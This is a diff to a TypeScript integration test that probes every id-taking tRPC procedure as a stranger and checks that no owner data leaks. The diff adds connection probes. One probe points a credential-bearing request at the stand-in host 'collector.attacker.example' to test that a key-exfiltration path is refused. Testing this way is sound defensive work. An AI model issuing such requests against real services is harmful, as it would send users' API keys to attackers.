@@ -2,7 +2,9 @@
 // Seed one-of-everything as owner A (real rows, distinctive marker NAMES), then probe EVERY id-taking tRPC
 // procedure as a STRANGER (owner B) with A's real ids, asserting a LEAK-FREE outcome: a thrown TRPCError is
 // `NOT_FOUND` (the doctrine's leak-free collapse — NEVER `FORBIDDEN`, which is an existence oracle for an
-// owned entity), and a resolved value carries NONE of A's marker names (never A's row). A post-sweep
+// owned entity) or the probe's own DECLARED refusal where a domain spells that collapse differently and
+// proves it indistinguishable by target (see `Refusal` — narrow, per-probe, and STRICTER than the default
+// arm because it also forbids resolving), and a resolved value carries NONE of A's marker names. A post-sweep
 // integrity re-read proves no probe silently MUTATED A's world (a write-IDOR that returns void).
 //
 // It runs over the REAL composition root (`app` fixture = the whole server graph) through the REAL tRPC
@@ -18,7 +20,19 @@
 // COMPOSED-REAL: the server graph loads in the untimed IMPORT phase, never inside the first test's timeout (#2386 — support/composed-real.ts).
 import "../../support/composed-real.ts";
 import type { ProviderId } from "@orb/contracts/inference";
-import { assets, characterDocuments, documents, notifications, plugins, themes, userCredentials, workloadSchedules, workloads } from "@orb/db";
+import {
+  assets,
+  characterDocuments,
+  connectionBindings,
+  documents,
+  notifications,
+  plugins,
+  themes,
+  userConnections,
+  userCredentials,
+  workloadSchedules,
+  workloads,
+} from "@orb/db";
 import type {
   AssetId,
   AutomationRuleId,
@@ -39,12 +53,14 @@ import type {
   RpgQuestId,
   TagId,
   ThemeId,
+  UserConnectionId,
   UserCredentialId,
   WorkloadId,
   WorkloadScheduleId,
 } from "@orb/kit/ids";
 import { castId, ID_PREFIX, mintTypeId } from "@orb/kit/ids";
 import type { AutomationService } from "@orb/server/domain/automation";
+import { CONNECTION_OP_CODES } from "@orb/server/domain/connection";
 import { appRouter } from "@orb/server/transport/trpc";
 import { strToU8, zipSync } from "fflate";
 import { describe } from "vitest";
@@ -115,6 +131,11 @@ const MARK = {
   // probes are the transport-tier proof of the whole authority model. The marker rides the plugin's `name`,
   // which `toPluginView` returns verbatim — a leaked `upgrade`/`setGrant` result carries it.
   plugin: "AlphaSecretPlugin",
+  // The inference program's `user_connections` row owned by A. The marker rides the LABEL, which
+  // `toView` returns verbatim on every connection read — so a leaked `get`/`update`/`capabilities` carries
+  // it. This row is the sharpest object on the whole surface: it names a SEALED CREDENTIAL by id, so a
+  // dropped owner predicate does not merely disclose a row, it hands a stranger a key to spend.
+  connection: "AlphaSecretConnection",
 } as const;
 const MARKERS = Object.values(MARK);
 
@@ -130,7 +151,13 @@ interface OwnerIds {
   // `tag.setTagOrder` probe sends the reversal; the post-sweep order re-read is the only witness (a
   // single-tag order was un-reversible, so the old probe could not fail — the `regexGlobalOrder*` shape).
   tagOrderBId: TagId;
-  credentialId: string;
+  // Branded, not `string`: the `connection.create` / `connection.listEndpointModels` probes hand A's
+  // credential id straight to the wire schema, which is where the credential-reach belt lives.
+  credentialId: UserCredentialId;
+  // A's connection row (the inference program's §5.3a surface). Every id-taking `connection.*` probe aims
+  // at THIS id — a synthesized one would collapse to the same refusal with the owner predicate DELETED,
+  // which is the "a probe that cannot fail" shape #795 minted the reverse detector for.
+  connectionId: UserConnectionId;
   themeId: ThemeId;
   workloadId: WorkloadId;
   // #795 — a SECOND workload for A, seeded `queued`. `workloadId` above is `failed` so that `retry` is
@@ -189,24 +216,76 @@ function trpcCode(e: unknown): string | null {
   return null;
 }
 
+/** The `DomainOperationError.code` discriminator riding a mapped TRPCError's `cause` — the one field that
+ *  tells a DELIBERATE leak-free collapse apart from any other 400 (see {@link Refusal}). `null` when the
+ *  cause carries no code (every other mapped class is codeless by design — error-mapping.ts `domainReason`). */
+function domainRefusalCode(e: unknown): string | null {
+  const cause: unknown = e instanceof Error ? (e as Error & { cause?: unknown }).cause : undefined;
+  if (cause === null || typeof cause !== "object") {
+    return null;
+  }
+  const code: unknown = (cause as { code?: unknown }).code;
+  return typeof code === "string" ? code : null;
+}
+
+/**
+ * A domain whose documented leak-free collapse is NOT the house `NOT_FOUND` — declared PER PROBE, never a
+ * global code allowlist, and only where the domain PROVES the refusal is indistinguishable by target.
+ *
+ * The one population today is `connection.*`: `fetchOwnedConnection` returns null for BOTH "no such row" and
+ * "not yours", and `ConnectionNotFoundError` is a `DomainOperationError`
+ * (`domain/connection/contract/errors.ts` — "collapses not-owned and not-found on purpose so a 404 never
+ * leaks that a row exists for someone else"), so the wire code is `BAD_REQUEST` + `connection_not_found`.
+ * That satisfies the SECURITY property this sweep enforces (a stranger cannot tell A's row from no row);
+ * `NOT_FOUND` is the house SPELLING of it, and a probe declaring a refusal still accepts `NOT_FOUND`.
+ *
+ * WHAT IT DOES NOT WIDEN — the teeth are in the `reason` pin: any OTHER 400 (a validation error, a
+ * `task_unservable` that means the belt was passed), any 403/500, and ANY RESOLVE are still findings. A
+ * probe carrying a `refusal` is therefore STRICTER than the default arm, which tolerates a marker-free
+ * resolve.
+ */
+interface Refusal {
+  readonly code: "BAD_REQUEST";
+  /** The exact `CONNECTION_OP_CODES` member the belt throws — never a prefix, never a wildcard. */
+  readonly reason: string;
+}
+
+/** "this row is not yours, or there is no such row" — one code for both, by design. */
+const CONNECTION_NOT_YOURS: Refusal = { code: "BAD_REQUEST", reason: CONNECTION_OP_CODES.notFound };
+/** "that credential is not yours, or there is no such credential" — the same collapse one id over. */
+const CONNECTION_CREDENTIAL_FOREIGN: Refusal = { code: "BAD_REQUEST", reason: CONNECTION_OP_CODES.credentialForeign };
+/** "that binding actor (a rule / a plugin) is not yours, or there is no such actor". */
+const CONNECTION_ACTOR_FOREIGN: Refusal = { code: "BAD_REQUEST", reason: CONNECTION_OP_CODES.actorForeign };
+
 /**
  * The uniform leak-free VERDICT for ONE stranger probe (pure — the sweep collects verdicts then asserts once,
  * so there is no branching `expect`). A probe is a LEAK (verdict `ok:false`) if it:
- *   • throws a NON-`NOT_FOUND` error (a `FORBIDDEN` existence-oracle, a 500, a non-tRPC throw), OR
+ *   • throws a NON-`NOT_FOUND` error (a `FORBIDDEN` existence-oracle, a 500, a non-tRPC throw) that is not
+ *     the probe's declared {@link Refusal}, OR
  *   • resolves with any of owner A's marker NAMES in the serialized result.
  * A `NOT_FOUND` throw or a benign marker-free resolve (a no-op mutation / empty list) is leak-free unless
  * the probe explicitly requires the authority contract to reject. Those probes must not silently resolve.
  */
-async function leakVerdict(path: string, thunk: () => Promise<unknown>, requireNotFound = false): Promise<string | null> {
+function throwVerdict(path: string, e: unknown, refusal: Refusal | undefined): string | null {
+  const code = trpcCode(e);
+  const reason = domainRefusalCode(e);
+  if (code === "NOT_FOUND" || (refusal !== undefined && code === refusal.code && reason === refusal.reason)) {
+    return null;
+  }
+  const seen = code === null ? `non-tRPC ${String(e)}` : `${code}${reason === null ? "" : ` (${reason})`}`;
+  const wanted = refusal === undefined ? "NOT_FOUND" : `NOT_FOUND or the declared ${refusal.code} (${refusal.reason})`;
+  return `${path}: a stranger's rejection must be leak-free ${wanted}, got ${seen}`;
+}
+
+async function leakVerdict(path: string, thunk: () => Promise<unknown>, requireNotFound = false, refusal?: Refusal): Promise<string | null> {
   let value: unknown;
   try {
     value = await thunk();
   } catch (e) {
-    const code = trpcCode(e);
-    return code === "NOT_FOUND" ? null : `${path}: a stranger's rejection must be leak-free NOT_FOUND, got ${code ?? `non-tRPC ${String(e)}`}`;
+    return throwVerdict(path, e, refusal);
   }
-  if (requireNotFound) {
-    return `${path}: a stranger must be rejected with leak-free NOT_FOUND, but the call resolved`;
+  if (requireNotFound || refusal !== undefined) {
+    return `${path}: a stranger must be rejected with a leak-free refusal, but the call resolved`;
   }
   const leaked = MARKERS.find((m) => (JSON.stringify(value) ?? "").includes(m));
   return leaked === undefined ? null : `${path}: a stranger's result leaked owner A's data ("${leaked}")`;
@@ -254,6 +333,9 @@ interface Probe {
   readonly path: string;
   readonly call: (stranger: AppCaller, ids: OwnerIds) => Promise<unknown>;
   readonly requireNotFound?: boolean;
+  /** The domain's documented non-`NOT_FOUND` leak-free collapse — see {@link Refusal}. Declaring one also
+   *  makes a RESOLVE a finding (the belt must refuse). */
+  readonly refusal?: Refusal;
 }
 
 // Synthesized secondary ids — `brandedId` is `z.string().min(1)` (no prefix check), and the OWNER/MEMBER
@@ -724,15 +806,10 @@ const PROBES: readonly Probe[] = [
     path: "discovery.similarChats",
     call: (c, i) => c.discovery.similarChats({ chatId: i.chatId }),
   },
-  // ── search similarity (seed-id-taking) — the seed read is owner-belted (assets.ownerId), so a stranger
-  //    seeding with A's characterId reads NO seed vector and short-circuits to an empty list (leak-free;
-  //    never A's neighbourhood — the neo V2-2 cross-tenant-seed refusal). `discover` is query-only (no seed
-  //    id) → EXEMPT (self-scoped ownerId); `similarCharacters` is now `search.search` (over: "characters")
-  //    → EXEMPT below, its owner-belt proven in search.int.test.ts. ──
-  {
-    path: "search.similarArt",
-    call: (c, i) => c.search.similarArt({ characterId: i.characterId, topN: 5 }),
-  },
+  // ── search similarity (seed-id-taking): `discover` is query-only (no seed id) → EXEMPT (self-scoped
+  //    ownerId); `similarCharacters` is now `search.search` (over: "characters") and `similarArt` joined it
+  //    in the EXEMPT block below — both are unprobeable in an embedder-less harness, with their owner belts
+  //    proven in the search domain's own slices. ──
   // ── workloads (F3 per-user owner-scoped; get/cancel/retry take a workloadId) — a non-admin stranger must
   //    see a leak-free NOT_FOUND on a foreign workload (its `error` carries A's marker, so a broken gate that
   //    resolved A's row would leak it here). `list`/`start`/`subscribe` are EXEMPT (see below). ──
@@ -1578,6 +1655,66 @@ const PROBES: readonly Probe[] = [
     path: "regex.applyScopeOrder",
     call: (c, i) => c.regex.applyScopeOrder({ scope: { kind: "global" }, orderedScriptIds: [i.regexGlobalOrderBId, i.regexGlobalOrderAId] }),
   },
+  // ── connection (the inference program's §5.3a surface). TWO cross-tenant-reachable ids, and both are
+  //    sharper than an ordinary owned row:
+  //      • `connectionId` names a row that names a SEALED CREDENTIAL. A dropped `user_connections.owner_id`
+  //        predicate does not merely disclose a label — `probe`/`verifyAuth`/`accountCredits`/`catalogModels`
+  //        RESOLVE the row through the runtime, which decrypts A's key and dials A's provider on B's behalf.
+  //      • `credentialId` reaches the two verbs that take one from the WIRE (`create`, `listEndpointModels`).
+  //        `listEndpointModels` is the worst case on the whole router: it dials a CALLER-NAMED baseUrl with
+  //        the named credential's bearer attached, so a dropped `credentialOwned` belt is a one-call exfil of
+  //        A's key to an attacker-chosen collector. Both probes name an attacker host / A's credential on
+  //        purpose, and `admitEndpointDraft` must refuse BEFORE any fetch leaves the box.
+  //    REFUSAL SHAPE: the domain collapses not-found and not-yours into ONE `DomainOperationError`
+  //    (`ConnectionNotFoundError`, deliberately — contract/errors.ts), which maps to BAD_REQUEST +
+  //    `connection_not_found`, not the house 404. Each probe declares that exact pair (see `Refusal`): any
+  //    other code, any other reason, and any RESOLVE are findings. ──
+  { path: "connection.get", call: (c, i) => c.connection.get({ connectionId: i.connectionId }), refusal: CONNECTION_NOT_YOURS },
+  {
+    path: "connection.update",
+    // ATTACKER_TEXT in the label: the reverse detector reads A's own row post-sweep, so a landed patch is
+    // caught even though a refused and a landed update look identical from the stranger's side.
+    call: (c, i) => c.connection.update({ connectionId: i.connectionId, patch: { label: ATTACKER_TEXT, model: ATTACKER_TEXT } }),
+    refusal: CONNECTION_NOT_YOURS,
+  },
+  { path: "connection.remove", call: (c, i) => c.connection.remove({ connectionId: i.connectionId }), refusal: CONNECTION_NOT_YOURS },
+  { path: "connection.capabilities", call: (c, i) => c.connection.capabilities({ connectionId: i.connectionId }), refusal: CONNECTION_NOT_YOURS },
+  { path: "connection.catalogModels", call: (c, i) => c.connection.catalogModels({ connectionId: i.connectionId }), refusal: CONNECTION_NOT_YOURS },
+  { path: "connection.probe", call: (c, i) => c.connection.probe({ connectionId: i.connectionId }), refusal: CONNECTION_NOT_YOURS },
+  { path: "connection.accountCredits", call: (c, i) => c.connection.accountCredits({ connectionId: i.connectionId }), refusal: CONNECTION_NOT_YOURS },
+  {
+    path: "connection.generationCost",
+    call: (c, i) => c.connection.generationCost({ connectionId: i.connectionId, generationId: "gen_alpha" }),
+    refusal: CONNECTION_NOT_YOURS,
+  },
+  { path: "connection.verifyAuth", call: (c, i) => c.connection.verifyAuth({ connectionId: i.connectionId }), refusal: CONNECTION_NOT_YOURS },
+  { path: "connection.inspectEndpoint", call: (c, i) => c.connection.inspectEndpoint({ connectionId: i.connectionId }), refusal: CONNECTION_NOT_YOURS },
+  // The two BINDING writes that name a foreign connection: a landed write would point the STRANGER's own
+  // task at A's row, i.e. spend A's credential on every subsequent turn. The post-sweep pin reads B's
+  // bindings back, because a hijacked binding lands in B's world and A's row re-reads clean.
+  { path: "connection.setBinding", call: (c, i) => c.connection.setBinding({ task: "chat", connectionId: i.connectionId }), refusal: CONNECTION_NOT_YOURS },
+  { path: "connection.useForEverything", call: (c, i) => c.connection.useForEverything({ connectionId: i.connectionId }), refusal: CONNECTION_NOT_YOURS },
+  // The CREDENTIAL-reach pair. `credentialOwned` is the only belt; its refusal is a different documented
+  // code (`connection_credential_foreign`), collapsed the same way — `credentialOwned` answers false for a
+  // credential that does not exist AND for one that is A's, so neither probe is an existence oracle.
+  {
+    path: "connection.create",
+    call: (c, i) => c.connection.create({ label: ATTACKER_TEXT, providerId: "openrouter", credentialId: i.credentialId, baseUrl: null, model: "x" }),
+    refusal: CONNECTION_CREDENTIAL_FOREIGN,
+  },
+  {
+    path: "connection.listEndpointModels",
+    call: (c, i) => c.connection.listEndpointModels({ baseUrl: "https://collector.attacker.example/v1", credentialId: i.credentialId }),
+    refusal: CONNECTION_CREDENTIAL_FOREIGN,
+  },
+  // The ACTOR axis: a binding list may be read for a rule/plugin actor, and the actor must be the caller's
+  // (`ruleOwnedBy`). A's automation rule is the foreign actor here. The no-actor arm is self-scoped (the
+  // caller's own `user` bindings) and carries no foreign id, so this row is the whole cross-tenant surface.
+  {
+    path: "connection.listBindings",
+    call: (c, i) => c.connection.listBindings({ actor: { kind: "automation-rule", ruleId: i.automationRuleId } }),
+    refusal: CONNECTION_ACTOR_FOREIGN,
+  },
 ];
 
 // Every remaining procedure, with WHY it is not a cross-tenant IDOR probe. A new procedure that lands in
@@ -1633,13 +1770,13 @@ const EXEMPT: Readonly<Record<string, string>> = {
   // The credential MUTATION verbs guard on storage-enabled FIRST — the `app` fixture's SecretBox is keyless
   // (no CREDENTIALS_KEY), so they reject BAD_REQUEST (`credentials_disabled`) before the ownership check can
   // run. The cross-tenant gate is unreachable in this harness; owner-scoping is covered by the credentials
-  // domain int tests. (The read-shaped `fetchModels` IS probed — it degrades leak-free without a key.)
-  "credentials.setActive": "keyless-fixture: storage-disabled guard precedes the ownership check",
+  // domain int tests. (2026-09-20: `setActive`, `testHealth`, `inspectEndpoint` and the read-shaped
+  // `fetchModels` left this router with the @orb/inference cut-over — health/inspection now hang off a
+  // CONNECTION, not a credential, as `connection.probe` / `connection.verifyAuth` /
+  // `connection.inspectEndpoint` / `connection.listEndpointModels`, and all four are PROBED above.)
   "credentials.remove": "keyless-fixture: storage-disabled guard precedes the ownership check",
-  "credentials.testHealth": "keyless-fixture: storage-disabled guard precedes the ownership check",
   "credentials.markRevokedByUser": "keyless-fixture: storage-disabled guard precedes the ownership check",
   "credentials.clearRevoked": "keyless-fixture: storage-disabled guard precedes the ownership check",
-  "credentials.inspectEndpoint": "keyless-fixture: storage-disabled guard precedes the ownership check",
   "assets.listOwned": "self-scoped",
   "assets.listGallery": "self-scoped",
   // #67 render resolvers — both return `{assetId, hash}` pairs (asset HASHES, never a marker NAME), so the
@@ -1687,6 +1824,19 @@ const EXEMPT: Readonly<Record<string, string>> = {
   // set) — a stranger's id yields []. Unprobeable HERE: the digest/segment path requires a live embedder
   // and this sweep runs vllmDisabled (no engine). The owner belt is proven leak-free by the dedicated slice
   // tests/server/domain/search/verbs/search.int.test.ts (foreign character id → [], foreign chatId → []).
+  // RECLASSIFIED 2026-09-20 (the @orb/inference cut-over). It was PROBED with A's characterId as the seed.
+  // The verb now resolves the CALLER's own `imageEmbed` binding FIRST (`verbs/similar-art.ts:22-23` —
+  // `roleClientsFor(ownerId)` + `requireSpaceModel`, where `ownerId` IS `ctx.auth.userId`, router:68), and
+  // this harness runs with no embedder and no bindings, so the stranger is refused
+  // `SEARCH_NO_SPACE` → BAD_REQUEST before the seed read. That is a CALLER precondition, not a verdict about
+  // the target: it is byte-identical for A's characterId, the stranger's own, and one that does not exist,
+  // so nothing about the seed is learnable from it. Exempt rather than tolerated, because the probe was
+  // ALREADY toothless here for a second reason — A's avatar vectors are never seeded (they need an embedder),
+  // so with the `assets.ownerId` belt DELETED the stranger's seed read still returns null → []. The belt is
+  // proven where the data exists: verbs/similar-art.int.test.ts ("REFUSES a cross-tenant seed", model-
+  // populated) and persistence/image-nearest.int.test.ts ("never returns another owner's image").
+  "search.similarArt":
+    "caller-precondition + unprobeable under vllmDisabled: the caller's own imageEmbed binding is resolved before the seed read (identical refusal for any seed id), and A has no avatar vectors to leak here. Belt proven in verbs/similar-art.int.test.ts + persistence/image-nearest.int.test.ts",
   "search.search":
     "owner-belted-per-scope: ids in `scope` are owner-belted; unprobeable under vllmDisabled (needs an embedder). Belt proven in search.int.test.ts. The `documents` target (DB5) is owner-ONLY on the omnibox (requireOwnerScope → scope `{ownerId: principal.userId}`); the chat/character scopes are reached only via the compose-injected op (chat's already-authorized GATHER), never the wire — the databank scope-leak belt is proven in search/verbs/documents.int.test.ts (gate-8).",
   "discovery.duplicateCharacters": "self-scoped: userId = principal.userId",
@@ -1710,17 +1860,15 @@ const EXEMPT: Readonly<Record<string, string>> = {
   "discovery.charactersByImageFacet": "self-scoped: userId = principal.userId; facet/value are allowlisted strings, not an owned id",
   "discovery.home": "self-scoped: userId = principal.userId",
   "discovery.themeDetail": "self-scoped: userId = principal.userId; clusterIdx is a facet index, not an owned id (the theme list is owner-scoped)",
-  "connection.getCatalog": "not-owned: the deployment-global model catalog",
-  "connection.getAgentSdkCatalog": "not-owned: the deployment-global agent-sdk daemon model catalog (no id, authed browse)",
   "connection.resolveChatCapability":
-    "self-scoped: resolves the caller's OWN chat-role GenerationCapability from principal.userId's settings — " +
-    "NO input at all (no caller-supplied user id/role), so there is no foreign id to probe",
-  "connection.getModelsForSource":
-    "self-scoped: the read-only picker facade over (source, role) — reads the caller's OWN credential " +
-    "availability + the deployment catalog; no owned/foreign id in the input",
-  "connection.orCredits": "self-scoped: reads the caller's OWN provider key",
-  "connection.orGenerationCost": "not-owned: an upstream OpenRouter generation handle",
-  "connection.testClaudeAuth": "self-scoped: the caller's own max-pro-sub health check",
+    "self-scoped: folds the caller's OWN `chat` binding through the runtime resolver from principal.userId — " +
+    "NO input at all (no caller-supplied user id/role/connection id), so there is no foreign id to probe",
+  "connection.list": "self-scoped: takes NO input; listOwnedConnections filters WHERE user_connections.owner_id = principal.userId",
+  // The provider REGISTRY, not a user's rows: built-ins ∪ the admin/plugin rows, each with its wire's build
+  // state. No input, no owned row, and every authenticated caller is answered identically — a provider a
+  // principal cannot use is LISTED DISABLED rather than hidden (§5.3a), so even the shape carries no tenant
+  // signal. Its two WRITE doors are adminProcedure and exempt below.
+  "connection.providersAvailable": "deployment-global: the provider registry + per-wire build state; no input, no owned row, identical for every caller",
   // The multiplexed socket (SSE-1). `attach`/`detach` are ordinary mutations and ARE probed below. `connect`
   // is the one EventSource and NEVER TERMINATES, so the sweep's drain would hang on it — the exemption is the
   // same one every other subscription here carries. Its cross-tenant teeth are a dedicated unit test: a
@@ -1767,8 +1915,6 @@ const EXEMPT: Readonly<Record<string, string>> = {
   "admin.listSessions": "admin-gated: role gate",
   "admin.revokeSession": "admin-gated: role gate",
   "admin.revokeUserSessions": "admin-gated: role gate",
-  "admin.vllmEngines": "admin-gated: role gate",
-  "admin.restartVllmEngine": "admin-gated: role gate",
   // plugin (D46/D147) — RECLASSIFIED 2026-08-24. The five management verbs used to be exempt as "admin-gated:
   // the install-authority role gate precedes the pluginId ownership check". That classification is DEAD:
   // plugins are user-scoped, the `can(caller,"admin",{kind:"global"})` gate is gone from every verb, and the
@@ -1810,7 +1956,13 @@ const EXEMPT: Readonly<Record<string, string>> = {
   "workloads.createSchedule": "self-scoped: stamps ownerId = caller (a bulk schedule requires the box owner); no foreign id",
   "workloads.listSchedules": "self-scoped: a non-admin caller is forced to its own ownerId (no cross-tenant id)",
   "connection.refreshCatalog": "admin-gated: writes the deployment KV snapshot",
-  "connection.refreshAgentSdkCatalog": "admin-gated: writes the deployment agent-sdk catalog KV snapshot",
+  // The registry's two WRITE doors (§5.9-1). Both are `adminProcedure`, so the sweep's plain-user stranger is
+  // refused FORBIDDEN at LAYER 1 before any lookup — the `admin.*` role-gate pattern, tested by the
+  // admin-gate matrix, not IDOR. Neither takes an owned id: `registerProvider` takes a row VALUE (and the
+  // runtime refuses a built-in id, so a row can never shadow one and inherit its sealed credentials) and
+  // `dropProvider` takes a deployment provider id, not an entity a user holds.
+  "connection.registerProvider": "admin-gated: role gate (deployment provider policy from a row VALUE; no foreign id)",
+  "connection.dropProvider": "admin-gated: role gate (drops a deployment provider row; not a user-owned entity)",
   // databank — the id-taking verbs are PROBED above; these two take no foreign id (verified in the verbs):
   "databank.createFromText": "self-scoped: stamps ownerId = principal.userId; input is name + text, no foreign id",
   "databank.scrapeWeb":
@@ -1921,6 +2073,18 @@ describe("cross-tenant IDOR sweep — every id-taking procedure is leak-free for
       label: MARK.credential,
       createdAt: 1,
       updatedAt: 1,
+    });
+
+    // A's CONNECTION row (front door — `connection.create`). A hosted provider (`auth: apiKey`) so the row
+    // needs no base URL and never touches the F12 private-endpoint admission, and `credentialId: null` so
+    // the keyless `app` fixture can mint it; the ownership probes never resolve a secret, they gate on
+    // `user_connections.owner_id`. The LABEL is A's marker — `toView` returns it verbatim on every read.
+    const connection = await owner.connection.create({
+      label: MARK.connection,
+      providerId: "openrouter",
+      credentialId: null,
+      baseUrl: null,
+      model: "anthropic/claude-sonnet-4",
     });
 
     // The turn/canon rows sidestep the provider — seed them directly (owner A is the host member).
@@ -2179,6 +2343,7 @@ describe("cross-tenant IDOR sweep — every id-taking procedure is leak-free for
       tagId: tag.id,
       tagOrderBId: tagOrderB.id,
       credentialId,
+      connectionId: connection.id,
       themeId,
       workloadId,
       queuedWorkloadId,
@@ -2214,7 +2379,7 @@ describe("cross-tenant IDOR sweep — every id-taking procedure is leak-free for
     // collected then asserted ONCE (no branching expect) so EVERY leak surfaces in a single readable diff.
     const leaks: string[] = [];
     for (const probe of PROBES) {
-      const verdict = await leakVerdict(probe.path, () => probe.call(otherCaller, ids), probe.requireNotFound);
+      const verdict = await leakVerdict(probe.path, () => probe.call(otherCaller, ids), probe.requireNotFound, probe.refusal);
       if (verdict !== null) {
         leaks.push(verdict);
       }
@@ -2309,6 +2474,24 @@ describe("cross-tenant IDOR sweep — every id-taking procedure is leak-free for
     expect(pluginStill[0]?.grantedCapabilities).toEqual(["chat.read"]); // setGrant never widened A's grant
     expect(pluginStill[0]?.netHosts).toEqual(["api.vendor.example"]); // the egress wall was not re-pointed
     expect(pluginStill[0]?.status).toBe("disabled"); // setEnabled never booted A's guest code as the stranger
+    // ── connection (§5.3a) — A's row names a SEALED CREDENTIAL, so its three probe families fail three
+    //    different ways and need three different witnesses:
+    //      • `update` overwrites label/model with the attacker's text — A's own re-read is the witness (and
+    //        the reverse detector below sweeps the same read for ATTACKER_TEXT).
+    //      • `remove` returns void — the row's EXISTENCE is the only witness.
+    //      • `setBinding`/`useForEverything`/`create` land in the STRANGER's world, not A's, so every A-side
+    //        re-read is structurally blind to them (the `character.duplicate` exfiltration shape). The
+    //        binding table and the credential reference are read DIRECTLY: a landed binding would point B's
+    //        every turn at A's row, i.e. spend A's key, while A's row re-reads byte-perfect.
+    const connectionStill = await ownerCaller.connection.get({ connectionId: ids.connectionId });
+    expect(connectionStill.label).toBe(MARK.connection); // survived connection.remove; untouched by connection.update
+    expect(connectionStill.model).toBe("anthropic/claude-sonnet-4"); // …and the patch's second field never landed either
+    const bindingRows = await db.select().from(connectionBindings);
+    expect(bindingRows.filter((row) => row.connectionId === ids.connectionId && row.userId !== OWNER_USER_ID)).toEqual([]);
+    // A's connection is keyless, so ANY row naming A's credential is one the stranger's `connection.create`
+    // probe minted — the whole point of the credential-reach belt (`credentialOwned`).
+    expect((await db.select().from(userConnections)).filter((row) => row.credentialId === ids.credentialId)).toEqual([]);
+
     // ── #755 — WRITE-authority for the owner-scoped E5 candidates the marker detector is STRUCTURALLY BLIND
     //    to. An UPDATE probe OVERWRITES A's marker field with the attacker's value ("hacked"), and a DELETE
     //    probe returns void, so a resolved probe carries no marker whether the write was REFUSED or SILENTLY
@@ -2404,6 +2587,7 @@ describe("cross-tenant IDOR sweep — every id-taking procedure is leak-free for
       hijackVerdict("worldInfo.getEntry", entryStill), // worldInfo.updateEntry
       hijackVerdict("databank.get", docStill), // databank.rename
       hijackVerdict("tag.listTags", tagStill), // tag.updateTag
+      hijackVerdict("connection.get", connectionStill), // connection.update (label + model)
     ].filter((v): v is string => v !== null);
     expect(hijacks, `cross-tenant WRITE-IDOR — the stranger's data landed in owner A's world (STOP-and-report):\n${hijacks.join("\n")}`).toEqual([]);
 
